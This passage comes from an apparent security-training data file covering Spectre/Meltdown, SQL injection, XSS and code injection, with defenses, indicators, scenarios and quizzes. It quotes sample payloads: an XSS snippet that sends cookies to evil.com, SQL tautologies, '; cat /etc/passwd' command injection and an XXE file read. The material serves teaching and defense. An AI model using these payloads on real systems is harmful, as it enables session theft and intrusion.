                'Microcode updates from CPU vendors (Intel, AMD, ARM) to add hardware mitigations',
                'Browser mitigations: Site Isolation, reduced timer precision (performance.now()), disabled SharedArrayBuffer',
                'Compiler-level mitigations: speculative load hardening, bounds checking after branches'
            ],
            response: [
                'Apply OS patches (KPTI for Meltdown) and CPU microcode updates immediately',
                'Update all hypervisors and cloud platform software for VM isolation fixes',
                'Update web browsers to versions with Spectre mitigations (Site Isolation)',
                'Benchmark performance impact and adjust capacity planning for 5-30% overhead',
                'Long-term: evaluate hardware refresh cycles for CPUs with architectural fixes'
            ]
        },
        indicators: {
            network: [
                'Not directly network-observable — Meltdown/Spectre are local attacks',
                'Cloud environments: unusual VM density or compute patterns may indicate exploitation',
                'Browser-based Spectre: JavaScript payloads in web pages performing high-precision timing',
                'Data exfiltration over network channels after successful local memory extraction',
                'Unusual cache-timing traffic patterns in shared hosting environments'
            ],
            host: [
                'Abnormally high cache miss rates detected via CPU performance counters',
                'Processes performing Flush+Reload patterns (repeated clflush instructions + timing measurements)',
                'High branch misprediction rates on specific code paths',
                'User-space processes accessing kernel virtual address ranges (Meltdown attempt)',
                'Unpatched kernel (missing KPTI) or outdated CPU microcode versions'
            ],
            behavioral: [
                'Unexplained performance degradation after applying KPTI patches (expected but validate cause)',
                'Processes performing systematic memory probing with microsecond-precision timing',
                'JavaScript executing high-resolution timing loops in browser contexts',
                'Unexpected kernel memory disclosure in crash dumps or debug output',
                'Cloud tenants experiencing unexplained data leakage across VM boundaries'
            ],
            tools: ['Spectre/Meltdown Checker (spectre-meltdown-checker.sh)', 'Intel MDS Tool', 'Linux /sys/devices/system/cpu/vulnerabilities/', 'InSpectre (Windows)', 'perf stat (HPC monitoring)', 'Immunity Debugger', 'cachegrab (SGX attacks)', 'Spectre PoC (Google Project Zero)']
        },
        interactive: {
            scenario: 'Your organization runs a private cloud (OpenStack) hosting multiple customer tenants on shared physical servers with Intel Xeon CPUs. The Meltdown/Spectre disclosure just dropped. A customer asks: "Can another tenant on the same physical host read our encryption keys from memory?" Your cloud engineering team reports that applying the kernel patches will cause a 15-25% performance degradation on database workloads. Management asks if you can delay patching. What do you recommend?',
            options: [
                'Delay patching until the performance impact can be better optimized — the attack is theoretical and no real-world exploits exist yet',
                'Patch immediately and accept the performance hit — Meltdown allows any process to read kernel memory, and Spectre can leak data across VM boundaries, fundamentally breaking tenant isolation. Add capacity to compensate for the performance overhead.',
                'Only patch the servers running the most sensitive workloads and leave others unpatched',
                'Switch to AMD processors since they are immune to all variants of the attack'
            ],
            correct: 1,
            explanation: 'In a multi-tenant cloud environment, Meltdown and Spectre break the fundamental security guarantee: tenant isolation. A malicious VM can read kernel memory (Meltdown) or data from co-located VMs (Spectre), potentially extracting encryption keys, credentials, and sensitive data. Delaying patching means knowingly operating a cloud where tenant isolation is broken. The correct response: (1) Patch ALL hosts immediately — KPTI for Meltdown, microcode + retpoline for Spectre, (2) Accept and plan for the performance impact by adding capacity, (3) Communicate transparently with customers about the situation and mitigations. AMD CPUs are not immune to Spectre (only less affected by Meltdown), so switching vendors is not a complete solution.'
        },
        quiz: [
            { question: 'What CPU performance optimization do Meltdown and Spectre exploit?', options: ['Hyperthreading', 'Speculative execution — where the CPU executes instructions ahead of time based on predictions', 'CPU overclocking', 'Multi-core parallel processing'], correct: 1, explanation: 'Speculative execution is a performance feature where the CPU predicts which instructions to execute next. If wrong, it rolls back — but the cache side effects of speculation remain, leaking data.' },
            { question: 'What is the key difference between Meltdown and Spectre?', options: ['Meltdown is software, Spectre is hardware', 'Meltdown reads kernel memory from user space; Spectre tricks processes into leaking their own data', 'Meltdown affects Intel, Spectre only affects AMD', 'Meltdown is more common, Spectre is more severe'], correct: 1, explanation: 'Meltdown breaks user/kernel isolation by exploiting out-of-order execution to read kernel memory. Spectre manipulates branch prediction to trick other processes or code into speculatively accessing and leaking their own data.' },
            { question: 'What is KPTI (Kernel Page Table Isolation) designed to mitigate?', options: ['Spectre Variant 1', 'Spectre Variant 2', 'Meltdown — by separating user and kernel page tables so the kernel is not mapped during user execution', 'Buffer overflow attacks'], correct: 2, explanation: 'KPTI (also called KAISER) removes kernel page table mappings from user space, so even if speculative execution occurs, there is no kernel memory mapped to read. It specifically mitigates Meltdown.' },
            { question: 'How do attackers extract data from speculative execution if the CPU rolls back the results?', options: ['The data is written to a file before rollback', 'Cache timing side channels — speculatively loaded cache lines remain, and access timing reveals the leaked data', 'Network packets are sent during speculation', 'Screen rendering occurs before rollback'], correct: 1, explanation: 'While architectural state is rolled back, microarchitectural state (CPU cache) is not. Attackers use Flush+Reload or Prime+Probe to measure cache access times, inferring which data was speculatively loaded.' },
            { question: 'Why is Spectre considered harder to fully mitigate than Meltdown?', options: ['Because Spectre affects more CPU vendors', 'Because Spectre exploits branch prediction — a fundamental feature of all modern CPUs that cannot be disabled without catastrophic performance loss', 'Because Spectre is a software bug', 'Because no patches exist for Spectre'], correct: 1, explanation: 'Meltdown has a clean fix (KPTI). Spectre exploits branch prediction, which is deeply embedded in all modern CPU designs. Mitigations (retpoline, IBRS) add overhead but new Spectre variants keep emerging because the fundamental prediction mechanism persists.' }
        ]
    },

    // =================================================================
    // 20. SQL INJECTION
    // =================================================================
    SQL_INJECTION: {
        code: 'SQL_INJECTION',
        title: 'SQL Injection',
        icon: '\u{1F4BE}',
        severity: 'critical',
        color: '#a855f7',
        description: 'An injection attack where malicious SQL statements are inserted into application input fields to manipulate or extract data from backend databases.',
        overview: {
            what: 'SQL Injection (SQLi) occurs when an attacker inserts malicious SQL code into an application\'s input fields, which is then executed by the backend database. This happens when applications build SQL queries by concatenating user input without proper sanitization or parameterization. SQLi remains one of the most prevalent and damaging web vulnerabilities, enabling data theft, authentication bypass, data modification, and in some cases, complete server compromise.',
            keyPoints: [
                'Classic SQLi: tautology attacks (OR 1=1), UNION SELECT for data extraction, stacked queries',
                'Blind SQLi: boolean-based (true/false responses) and time-based (WAITFOR DELAY/SLEEP) when no data is returned',
                'Out-of-band SQLi: data exfiltration via DNS, HTTP, or email when inline extraction is blocked',
                'Parameterized queries (prepared statements) are the definitive defense — not input filtering alone',
                'OWASP Top 10 #3 (Injection) consistently since 2010'
            ],
            examples: [
                { name: 'Heartland Payment Systems (2008)', detail: 'SQL injection led to the compromise of 130 million credit card numbers — the largest credit card breach at the time. Attacker Albert Gonzalez was sentenced to 20 years in prison.' },
                { name: 'Sony PlayStation Network (2011)', detail: 'SQL injection attack exposed personal data of 77 million user accounts, including names, addresses, and possibly credit card data. Sony took the PSN offline for 23 days.' },
                { name: 'TalkTalk (2015)', detail: 'A 15-year-old exploited a SQL injection vulnerability to steal personal data of 157,000 customers. TalkTalk was fined \u00A3400,000 and lost 101,000 customers.' }
            ],
            stats: [
                { label: 'Web apps vulnerable', value: '~32%', note: 'of web applications have SQLi flaws (HackerOne)' },
                { label: 'Avg. breach cost', value: '$4.45M', note: 'injection-related breaches (IBM 2024)' },
                { label: 'OWASP ranking', value: 'Top 3', note: 'Consistently in the top 3 most critical web vulnerabilities' }
            ]
        },
        attackFlow: {
            title: 'SQL Injection Attack Flow',
            steps: [
                { phase: 'Input Discovery', description: 'Attacker identifies input fields that interact with the database: login forms, search boxes, URL parameters, cookies, HTTP headers. Single quotes (\') and SQL keywords are injected to probe for errors.', icon: '\u{1F50D}' },
                { phase: 'Error Analysis', description: 'Database error messages reveal the SQL dialect (MySQL, MSSQL, PostgreSQL, Oracle), query structure, table names, and column types. Even generic errors confirm SQL injection vulnerability.', icon: '\u{1F4CB}' },
                { phase: 'Query Manipulation', description: 'Attacker crafts payloads: tautology (OR 1=1) for authentication bypass, UNION SELECT for data extraction, ORDER BY for column enumeration, or stacked queries (;DROP TABLE) for modification.', icon: '\u{270F}' },
                { phase: 'Data Extraction', description: 'Using UNION SELECT, the attacker reads database schema (information_schema), then extracts tables, columns, and data including credentials, PII, financial records, and admin accounts.', icon: '\u{1F4E4}' },
                { phase: 'Privilege Escalation', description: 'If the database user has elevated privileges, the attacker reads/writes files (LOAD_FILE, INTO OUTFILE), executes OS commands (xp_cmdshell in MSSQL), or accesses other databases on the server.', icon: '\u{2B06}' },
                { phase: 'Persistence & Covering Tracks', description: 'Attacker creates backdoor accounts, installs web shells via INTO OUTFILE, modifies log tables, or establishes ongoing data exfiltration through blind/out-of-band channels.', icon: '\u{1F6AA}' }
            ]
        },
        defense: {
            detection: [
                'Web Application Firewall (WAF) rules detecting SQL keywords in input parameters',
                'Database activity monitoring (DAM) for unusual query patterns and data access volumes',
                'Input validation alerts: single quotes, UNION, SELECT, DROP, OR 1=1 patterns',
                'Application logging of all database queries with parameterized vs. concatenated distinction',
                'Runtime Application Self-Protection (RASP) detecting query manipulation at execution'
            ],
            prevention: [
                'Parameterized queries (prepared statements) for ALL database interactions — no exceptions',
                'Stored procedures with parameterized inputs as an additional layer',
                'Input validation: whitelist allowed characters, reject or escape special characters',
                'Principle of least privilege: database accounts used by applications should have minimal permissions',
                'Disable detailed database error messages in production (custom error pages only)'
            ],
            response: [
                'Identify the injection point and immediately deploy a WAF rule to block the attack pattern',
                'Audit database logs to determine what data was accessed or modified',
                'Reset all database credentials and application service account passwords',
                'Fix the vulnerable code by replacing string concatenation with parameterized queries',
                'Conduct a full application security assessment (code review + DAST scan) to find additional SQLi vulnerabilities'
            ]
        },
        indicators: {
            network: [
                'HTTP requests containing SQL keywords (UNION, SELECT, DROP, INSERT, OR 1=1) in parameters',
                'URL-encoded SQL injection attempts in query strings (%27 for single quote, %3B for semicolon)',
                'High volume of requests to the same endpoint with varying payloads (automated scanning)',
                'Unusually large HTTP responses from pages that normally return small results (data dumping)',
                'Time-based blind SQLi: requests causing consistent server response delays (WAITFOR DELAY, SLEEP)'
            ],
            host: [
                'Database error logs showing syntax errors from injected SQL fragments',
                'Unusual queries accessing information_schema or system tables',
                'Database account executing queries outside its normal pattern (file reads, OS commands)',
                'Web server logs with SQL keywords in request parameters',
                'New database users or modified permissions not aligned with change management'
            ],
            behavioral: [
                'Systematic probing of input fields with escalating SQL injection complexity',
                'Large data extractions from database following a series of reconnaissance queries',
                'Application database account suddenly accessing tables it has never queried before',
                'Web shells appearing on the server after database file-write operations',
                'Automated scanner signatures: sqlmap, Havij, or jSQL user-agent strings or patterns'
            ],
            tools: ['sqlmap (automated SQLi)', 'Burp Suite', 'OWASP ZAP', 'Havij', 'jSQL Injection', 'NoSQLMap', 'DB Browser for SQLite', 'Database Activity Monitoring (DAM) tools']
        },
        interactive: {
            scenario: 'A junior developer writes this login query: SELECT * FROM users WHERE username = [username] AND password = [password] — using string concatenation to insert user input directly into the SQL. During a code review, you notice this. The developer says: "I added input validation that blocks the word DROP so it\'s safe." Is the developer correct? What do you do?',
            options: [
                'The developer is correct — blocking DROP prevents SQL injection',
                'Add more keywords to the blocklist (UNION, SELECT, INSERT) for better protection',
                'The developer is wrong — keyword blocklists are easily bypassed. Rewrite the query using parameterized queries (prepared statements) and explain that input filtering is a supplement to, not a replacement for, parameterization',
                'Add a WAF in front of the application instead of fixing the code'
            ],
            correct: 2,
            explanation: 'Keyword blocklists are trivially bypassed through: case alternation (DrOp, sElEcT), encoding (%55NION), comments (UN/**/ION), or null bytes. The ONLY reliable defense is parameterized queries, which separate SQL code from data at the database driver level — the database engine never interprets user input as SQL. Example fix: `SELECT * FROM users WHERE username = ? AND password = ?` with values passed as parameters. WAFs are useful as defense-in-depth but cannot replace secure coding.'
        },
        quiz: [
            { question: 'What is the fundamental cause of SQL injection vulnerabilities?', options: ['Weak database passwords', 'Building SQL queries by concatenating user input instead of using parameterized queries', 'Using open-source databases', 'Not having a firewall'], correct: 1, explanation: 'SQL injection occurs when user input is concatenated directly into SQL query strings, allowing the database to interpret attacker input as SQL code instead of data.' },
            { question: 'An attacker enters `admin\' OR 1=1 --` as a username. What type of SQLi attack is this?', options: ['Blind SQLi', 'A tautology attack — OR 1=1 makes the WHERE clause always true, bypassing authentication', 'UNION-based extraction', 'Time-based injection'], correct: 1, explanation: 'This is a classic tautology attack. The input closes the username string, adds OR 1=1 (always true), and comments out the rest of the query (--), causing the database to return all users and bypass the login check.' },
            { question: 'What is blind SQL injection?', options: ['SQL injection that does not require seeing the database', 'SQL injection where the attacker cannot see query results directly but infers data through true/false responses or time delays', 'SQL injection performed with eyes closed', 'SQL injection that only works on encrypted databases'], correct: 1, explanation: 'In blind SQLi, error messages and data are not returned to the attacker. Instead, they ask true/false questions (boolean-based) or measure response times (time-based) to extract data one bit at a time.' },
            { question: 'Why are parameterized queries the definitive defense against SQL injection?', options: ['They encrypt the SQL query', 'They separate SQL code from data at the driver level — the database engine never interprets user input as SQL commands', 'They are faster than regular queries', 'They automatically validate all input'], correct: 1, explanation: 'Parameterized queries send the SQL template and user data separately to the database engine. The engine compiles the SQL first, then binds the data as literal values — making it structurally impossible for user input to alter the query logic.' },
            { question: 'An attacker uses `ORDER BY 5--` and gets an error, but `ORDER BY 4--` works. What did they learn?', options: ['The database has 5 tables', 'The current query returns 4 columns — this information is needed to craft a UNION SELECT with the correct number of columns', 'The database has 4 users', 'The server runs on port 4'], correct: 1, explanation: 'ORDER BY N tests if column N exists in the result set. When ORDER BY 5 errors but ORDER BY 4 succeeds, the attacker knows the query returns exactly 4 columns — essential for constructing a valid UNION SELECT statement.' }
        ]
    },

    // =================================================================
    // 21. CROSS-SITE SCRIPTING (XSS)
    // =================================================================
    XSS: {
        code: 'XSS',
        title: 'Cross-Site Scripting (XSS)',
        icon: '\u{1F4DC}',
        severity: 'high',
        color: '#a855f7',
        description: 'A web vulnerability where attackers inject malicious scripts into trusted websites, which execute in victims\' browsers to steal cookies, session tokens, or redirect users to malicious sites.',
        overview: {
            what: 'Cross-Site Scripting (XSS) occurs when a web application includes untrusted data in its output without proper validation or encoding, allowing attackers to inject client-side scripts (typically JavaScript) that execute in other users\' browsers. There are three main types: Reflected XSS (payload in the request, reflected in the response), Stored XSS (payload persisted in the database, served to all visitors), and DOM-based XSS (payload manipulates the client-side DOM without server involvement). XSS enables cookie theft, session hijacking, keylogging, defacement, and phishing.',
            keyPoints: [
                'Reflected XSS: payload is in the URL/request and reflected back in the response (most common, requires user to click a link)',
                'Stored XSS: payload is saved in the database and served to every visitor (most dangerous — no click needed)',
                'DOM-based XSS: client-side JavaScript processes attacker-controlled data unsafely (e.g., document.location, innerHTML)',
                'Content Security Policy (CSP) headers are the primary browser-level defense',
                'Output encoding (HTML entity encoding) is the primary code-level defense'
            ],
            examples: [
                { name: 'Samy Worm — MySpace (2005)', detail: 'The fastest spreading virus at the time — a stored XSS worm on MySpace that added "Samy is my hero" to profiles and sent friend requests. Infected 1 million users in 20 hours.' },
                { name: 'British Airways (2018)', detail: 'Magecart group injected XSS into BA\'s payment page, skimming credit card details from 380,000 customers over 15 days. BA was fined \u00A3183 million under GDPR.' },
                { name: 'eBay XSS (2015-2016)', detail: 'Stored XSS in eBay listing descriptions allowed attackers to inject scripts into product pages, redirecting buyers to phishing sites and stealing credentials.' }
            ],
            stats: [
                { label: 'Web apps affected', value: '~53%', note: 'of web applications have XSS vulnerabilities (HackerOne)' },
                { label: 'Bug bounty reports', value: '#1', note: 'Most reported vulnerability class in bug bounty programs' },
                { label: 'OWASP ranking', value: 'Top 3', note: 'Consistently in the OWASP Top 10' }
            ]
        },
        attackFlow: {
            title: 'XSS Attack Flow',
            steps: [
                { phase: 'Injection Point Discovery', description: 'Attacker identifies where user input is reflected or stored in page output: search results, comments, profile fields, URL parameters, error messages. Test payloads like <script>alert(1)</script> probe for unescaped output.', icon: '\u{1F50D}' },
                { phase: 'Payload Crafting', description: 'Attacker develops a payload that bypasses filters: event handlers (onerror, onload), alternative tags (img, svg, iframe), encoding tricks (HTML entities, Unicode, URL encoding), or DOM manipulation.', icon: '\u{270F}' },
                { phase: 'Delivery', description: 'For reflected XSS: crafts a URL with the payload and tricks the victim into clicking it (email, social media). For stored XSS: submits the payload through a form (comment, profile) where it is saved and served to all visitors.', icon: '\u{1F4E8}' },
                { phase: 'Script Execution', description: 'When a victim\'s browser renders the page containing the injected payload, the script executes in the context of the trusted website with full access to cookies, session storage, and DOM.', icon: '\u{26A1}' },
                { phase: 'Data Exfiltration', description: 'The malicious script steals session cookies (document.cookie), captures keystrokes, reads sensitive page content, or makes authenticated API requests on behalf of the victim — sending data to the attacker\'s server.', icon: '\u{1F4E4}' },
                { phase: 'Exploitation', description: 'Attacker uses stolen session tokens to hijack accounts, stolen credentials for further access, or leverages the trusted site\'s context to deliver secondary payloads (drive-by downloads, phishing forms).', icon: '\u{1F3AF}' }
            ]
        },
        defense: {
            detection: [
                'Web Application Firewall (WAF) rules detecting script tags, event handlers, and encoding bypass attempts',
                'Content Security Policy (CSP) violation reports (report-uri / report-to directives)',
                'Input validation alerts for HTML tags, JavaScript event handlers, and encoded scripts',
                'Browser developer tools detecting unexpected inline scripts on your pages',
                'Automated DAST scanning with tools like Burp Suite, OWASP ZAP, or Acunetix'
            ],
            prevention: [
                'Output encoding: HTML entity encode all user-supplied data before rendering in HTML context',
                'Content Security Policy (CSP): restrict script sources with strict-dynamic or nonce-based policies',
                'Use modern frameworks (React, Angular, Vue) that auto-escape output by default',
                'HTTPOnly and Secure flags on session cookies to prevent JavaScript access',
                'Input validation: whitelist allowed characters, reject or sanitize HTML tags'
            ],
            response: [
                'Identify and remove/sanitize the stored XSS payload from the database immediately',
                'Deploy emergency WAF rules to block the specific payload pattern',
                'Invalidate all active sessions for affected users (stolen cookies may be in use)',
                'Fix the vulnerable code with proper output encoding and CSP headers',
                'Scan the entire application for similar XSS vulnerabilities with automated tools'
            ]
        },
        indicators: {
            network: [
                'HTTP requests containing script tags, event handlers (onerror, onload, onmouseover), or javascript: URIs',
                'Outbound requests from users\' browsers to unknown external domains (exfiltrating stolen data)',
                'CSP violation reports indicating blocked inline script execution attempts',
                'Requests with encoded payloads: HTML entities (&#60;script&#62;), URL encoding (%3Cscript%3E), Unicode',
                'Unusual POST data in form submissions containing HTML or JavaScript'
            ],
            host: [
                'Database records containing script tags, event handlers, or encoded JavaScript payloads',
                'Web server access logs showing XSS probe patterns (<script>, alert(, onerror=)',
                'Unexpected changes to page content or DOM structure when inspecting served HTML',
                'JavaScript files modified to include malicious code (supply-chain XSS)',
                'Browser console errors from CSP blocking injected scripts'
            ],
            behavioral: [
                'Users reporting unexpected redirects, pop-ups, or login prompts on your site',
                'Session hijacking: accounts accessed from unusual IPs shortly after visiting specific pages',
                'Defaced pages or modified content visible to some users but not others (stored XSS)',
                'Automated scanning patterns: rapid requests with incrementally complex XSS payloads',
                'Magecart-style data skimming: payment form data sent to third-party domains'
            ],
            tools: ['Burp Suite', 'OWASP ZAP', 'XSStrike', 'DOMPurify (sanitization library)', 'CSP Evaluator (Google)', 'BeEF (Browser Exploitation Framework)', 'Acunetix', 'Retire.js (vulnerable JS libraries)']
        },
        interactive: {
            scenario: 'A user reports that visiting a product review page on your e-commerce site causes their browser to briefly redirect to an external site before returning. Your investigation reveals that a product review comment contains: `<img src=x onerror="document.location=\'https://evil.com/steal?c=\'+document.cookie">`. The comment was submitted 3 days ago and the page averages 2,000 daily visitors. What type of XSS is this, what is the impact, and what do you do?',
            options: [
                'This is reflected XSS — delete the comment and add a WAF rule',
                'This is stored XSS — the payload is in the database and has been executing for every visitor for 3 days. Immediately remove the payload from the database, invalidate all user sessions (up to 6,000 users may have had cookies stolen), deploy CSP headers, fix the review submission to HTML-encode output, and scan for similar payloads in all user-generated content',
                'This is DOM-based XSS — update the client-side JavaScript to fix the rendering issue',
                'Block the external domain at the firewall and the issue is resolved'
            ],
            correct: 1,
            explanation: 'This is stored XSS: the payload is persisted in the database and executes for every visitor. The img tag with onerror bypasses basic <script> tag filters. The impact: up to 6,000 users (2,000/day x 3 days) may have had their session cookies stolen. Remediation: (1) Remove the payload from the database NOW, (2) Invalidate ALL active sessions since cookies may be compromised, (3) Add Content Security Policy headers to prevent future inline script execution, (4) Fix the review rendering to HTML-encode all user content, (5) Scan all user-generated content for similar payloads, (6) Consider notifying affected users.'
        },
        quiz: [
            { question: 'What is the difference between reflected and stored XSS?', options: ['Reflected XSS uses JavaScript, stored XSS uses HTML', 'Reflected XSS payload is in the request and not persisted; stored XSS payload is saved in the database and served to all visitors', 'Reflected XSS is more dangerous than stored XSS', 'Reflected XSS only works in Chrome'], correct: 1, explanation: 'Reflected XSS requires tricking each victim into clicking a crafted URL. Stored XSS is saved on the server and automatically executes for every visitor — making it far more dangerous and scalable.' },
            { question: 'Why is `<img src=x onerror=alert(1)>` used as an XSS payload?', options: ['It displays an image with an alert', 'The invalid src triggers the onerror event handler, executing JavaScript without using a <script> tag — bypassing basic filters', 'It is the only way to execute JavaScript', 'It only works on old browsers'], correct: 1, explanation: 'This technique exploits HTML event handlers instead of <script> tags. When the browser fails to load the invalid image source (x), it fires the onerror event, executing the attacker\'s JavaScript. This bypasses filters that only block <script> tags.' },
            { question: 'What does Content Security Policy (CSP) protect against?', options: ['SQL injection', 'CSP restricts which scripts can execute on a page — blocking inline scripts and unauthorized script sources, preventing XSS exploitation', 'DDoS attacks', 'Brute force login attempts'], correct: 1, explanation: 'CSP is a browser security mechanism that controls which resources (scripts, styles, images) can load on a page. A strict CSP (e.g., script-src \'nonce-abc123\') blocks injected inline scripts even if XSS exists in the code.' },
            { question: 'The Samy worm on MySpace exploited which type of XSS?', options: ['Reflected XSS', 'Stored XSS — the worm payload was saved in profile pages and executed for every visitor, spreading to 1 million users in 20 hours', 'DOM-based XSS', 'None — it was not XSS'], correct: 1, explanation: 'Samy was a stored XSS worm. The payload was injected into MySpace profiles, and when other users viewed an infected profile, the worm copied itself to their profile, creating exponential spread.' },
            { question: 'What is the HTTPOnly cookie flag and how does it relate to XSS?', options: ['It makes cookies only work over HTTP, not HTTPS', 'It prevents JavaScript (including XSS payloads) from reading the cookie via document.cookie — protecting session tokens from theft', 'It encrypts cookie values', 'It deletes cookies after each request'], correct: 1, explanation: 'The HTTPOnly flag instructs the browser to block JavaScript access to the cookie. Even if XSS executes, document.cookie will not return HTTPOnly cookies — protecting session tokens from the most common XSS exploitation technique.' }
        ]
    },

    // =================================================================
    // 22. CODE INJECTION
    // =================================================================
    CODE_INJECTION: {
        code: 'CODE_INJECTION',
        title: 'Code Injection',
        icon: '\u{1F4BB}',
        severity: 'critical',
        color: '#a855f7',
        description: 'Attacks where malicious code is injected into an application for execution — including OS command injection, LDAP injection, XML injection, and template injection.',
        overview: {
            what: 'Code injection is a broad class of attacks where an attacker inserts malicious code into an application that is then executed by the interpreter. Unlike SQL injection (which targets databases), code injection encompasses OS command injection (executing system commands via shell), LDAP injection (manipulating directory queries), XML injection/XXE (exploiting XML parsers), Server-Side Template Injection (SSTI), and eval()-based injection in scripting languages. The common thread: user input is treated as executable code rather than data.',
            keyPoints: [
                'OS Command Injection: user input passed to system(), exec(), or shell commands (e.g., ; cat /etc/passwd)',
                'LDAP Injection: manipulating LDAP queries to bypass authentication or extract directory data',
                'XML External Entity (XXE): malicious XML with external entity references reads server files or triggers SSRF',
                'Server-Side Template Injection (SSTI): injecting template syntax ({{7*7}}) that executes on the server',
                'All variants share one root cause: mixing user data with executable code/queries'
            ],
            examples: [
                { name: 'Shellshock / Bash Bug (2014)', detail: 'CVE-2014-6271 — a vulnerability in Bash that allowed command injection via environment variables. Affected millions of web servers using CGI, IoT devices, and macOS systems. Exploited within hours of disclosure.' },
                { name: 'Equifax Breach via Apache Struts (2017)', detail: 'CVE-2017-5638 — an OGNL injection (expression language injection) in Apache Struts allowed remote code execution. Attackers stole personal data of 147 million Americans.' },
                { name: 'Capital One Breach via SSRF (2019)', detail: 'A misconfigured WAF combined with a Server-Side Request Forgery (SSRF) vulnerability allowed an attacker to execute commands against AWS metadata services, exposing 100+ million customer records.' }
            ],
            stats: [
                { label: 'OWASP ranking', value: '#3 Injection', note: 'Injection flaws are #3 in the 2021 OWASP Top 10' },
                { label: 'Command injection', value: '~12%', note: 'of critical vulnerabilities in web apps (HackerOne)' },
                { label: 'Equifax settlement', value: '$700M+', note: 'Resulting from a single injection vulnerability' }
            ]
        },
        attackFlow: {
            title: 'Code Injection Attack Flow',
            steps: [
                { phase: 'Input Identification', description: 'Attacker identifies inputs that are passed to interpreters: file paths, hostnames (ping/nslookup), search fields (LDAP), XML uploads, template fields, or any input processed by eval() or system calls.', icon: '\u{1F50D}' },
                { phase: 'Interpreter Fingerprinting', description: 'Tests reveal which interpreter processes the input: OS shell (command separators ;, |, &&), LDAP (parentheses, wildcards), XML parser (entity references), template engine ({{, ${, <%}).', icon: '\u{1F9EA}' },
                { phase: 'Payload Injection', description: 'Attacker crafts a payload for the identified interpreter: `; cat /etc/passwd` (OS), `)(|(password=*))` (LDAP), `<!ENTITY xxe SYSTEM "file:///etc/passwd">` (XXE), `{{config.items()}}` (SSTI).', icon: '\u{1F489}' },
                { phase: 'Code Execution', description: 'The application passes the payload to the interpreter, which executes it with the application\'s permissions. OS commands run as the web server user; LDAP queries run with the bind account\'s access.', icon: '\u{26A1}' },
                { phase: 'Data Extraction / Escalation', description: 'Attacker reads sensitive files (/etc/passwd, /etc/shadow, application config), enumerates the system, downloads credentials, or establishes a reverse shell for persistent access.', icon: '\u{1F4E4}' },
                { phase: 'Persistence', description: 'Installs backdoors (cron jobs, SSH keys, web shells), creates new user accounts, or modifies application code to maintain access beyond the initial injection point.', icon: '\u{1F6AA}' }
            ]
        },
        defense: {
            detection: [
                'Web Application Firewall (WAF) signatures for command separators (;, |, &&, ||), LDAP special characters, and XML entity declarations',
                'System call monitoring: detect web application processes spawning unexpected child processes (bash, cmd, powershell)',
                'File integrity monitoring on critical system files and application directories',
                'LDAP query logging for malformed or unusually broad queries',
                'XML parser logging for external entity resolution attempts'
            ],
            prevention: [
                'Never pass user input directly to OS commands — use language-native APIs (file operations, DNS lookups) instead of shell commands',
                'Input validation: strict whitelist of allowed characters, reject metacharacters (; | & ` $ ( ) < >)',
                'Parameterized LDAP queries and disable anonymous binds',
                'Disable external entities in XML parsers (XXE prevention): set disallow-doctype-decl=true',
                'Principle of least privilege: run application processes with minimal OS permissions'
            ],
            response: [
                'Isolate the affected system immediately — assume the attacker has shell access',
                'Audit system for backdoors: check cron jobs, SSH authorized_keys, web shells, new user accounts',
                'Review all application inputs for injection vulnerabilities (code review + DAST scanning)',
                'Rotate all credentials accessible from the compromised server (database, API keys, service accounts)',
                'Reimage the server from known-good backups after forensic analysis'
            ]
        },
        indicators: {
            network: [
                'HTTP requests containing command separators or shell metacharacters in parameters',
                'Outbound connections from the web server to unusual external hosts (reverse shell)',
                'DNS queries from the web server for attacker-controlled domains (out-of-band exfiltration)',
                'XML payloads containing DOCTYPE declarations with ENTITY definitions in HTTP requests',
                'LDAP traffic with malformed queries containing injection metacharacters'
            ],
            host: [
                'Web server process spawning unexpected child processes (bash, sh, cmd, powershell)',
                'Unauthorized file reads: /etc/passwd, /etc/shadow, application configuration files',
                'New cron jobs, scheduled tasks, or SSH keys not created by administrators',
                'Web shells in web-accessible directories (.php, .jsp, .asp files)',
                'Application logs showing command injection attempts or template syntax errors'
            ],
            behavioral: [
                'Web application suddenly making DNS queries or HTTP requests to external domains',
                'System resource usage spikes from injected commands (crypto mining, data exfiltration)',
                'File modifications in application directories without corresponding deployments',
                'New user accounts or SSH keys appearing on application servers',
                'LDAP directory modifications (new accounts, changed group memberships) without admin action'
            ],
            tools: ['Commix (OS command injection)', 'XXEinjector', 'Tplmap (SSTI)', 'Burp Suite', 'OWASP ZAP', 'ldapsearch (LDAP testing)', 'AppArmor / SELinux (process confinement)', 'Sysdig / Falco (runtime detection)']
        },
        interactive: {
            scenario: 'Your web application has a "network diagnostic" feature that lets users enter a hostname and pings it. The backend code is: `os.system("ping -c 4 " + user_input)`. A security researcher reports that entering `google.com; cat /etc/passwd` returns the system password file. Your developer proposes fixing it by blocking semicolons in the input. Is this sufficient?',
            options: [
                'Yes — blocking semicolons prevents command chaining and fixes the vulnerability',
                'No — add more characters to the blocklist (|, &, backticks) for complete protection',
                'No — character blocklists are always incomplete. Replace the system() call with a language-native ping library or subprocess with argument arrays (no shell interpretation). If a shell command is absolutely necessary, use strict whitelist validation (only allow a-z, 0-9, dots, and hyphens for hostnames).',
                'No — just add a WAF in front of the application and keep the current code'
            ],
            correct: 2,
            explanation: 'Character blocklists for command injection are notoriously incomplete. Beyond semicolons, attackers can use: pipes (|), background execution (&), backticks (`command`), $() substitution, newlines (%0a), and more. The correct fix: (1) Eliminate the shell entirely — use subprocess with an argument array: subprocess.run(["ping", "-c", "4", user_input]) which passes user_input as a single argument, not shell code. (2) If shell is unavoidable, strictly whitelist the input (only allow hostname-valid characters: a-z, 0-9, dots, hyphens). (3) WAFs help as defense-in-depth but must not replace secure coding.'
        },
        quiz: [
            { question: 'What is the fundamental difference between SQL injection and OS command injection?', options: ['They exploit the same interpreter', 'SQL injection targets database engines; OS command injection targets the operating system shell — but both occur because user input is mixed with executable code', 'Command injection is more common', 'SQL injection is always more dangerous'], correct: 1, explanation: 'Both are injection attacks with the same root cause (untrusted input treated as code), but they target different interpreters. SQLi manipulates database queries; command injection executes OS-level commands.' },
            { question: 'What is XML External Entity (XXE) injection?', options: ['Injecting XML into databases', 'Exploiting XML parsers that process external entity references to read server files, trigger SSRF, or cause denial of service', 'A type of XSS attack using XML', 'A database injection using XML format'], correct: 1, explanation: 'XXE exploits XML parsers that resolve external entity declarations. A malicious entity like <!ENTITY xxe SYSTEM "file:///etc/passwd"> causes the parser to read and return the server file contents.' },
